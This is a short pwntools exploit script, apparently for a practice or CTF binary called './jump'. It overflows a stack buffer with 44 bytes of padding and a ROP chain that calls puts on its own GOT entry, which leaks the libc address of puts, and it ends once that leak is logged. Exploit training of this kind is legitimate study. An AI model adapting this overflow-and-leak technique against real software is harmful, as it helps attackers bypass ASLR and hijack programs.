from pwn import *
import os
import posix
from struct import *

puts_plt = 0x08048390
puts_got = 0x08049ff0

fake_main = 0xdeadbeef

rop = ""
rop += p32(puts_plt)		# puts PLT 
rop += p32(fake_main)		# fake exit
rop += p32(puts_got)		# puts GOT

payload = "A"*44 + rop

prog = os.path.abspath("./jump")

p = process(prog)


print p.recv(15)	# "Deger giriniz:\n"

p.sendline(payload)

leak = p.recv(4)

puts_libc = u32(leak)
log.info("puts@libc: 0x%x" % puts_libc)
p.clean()

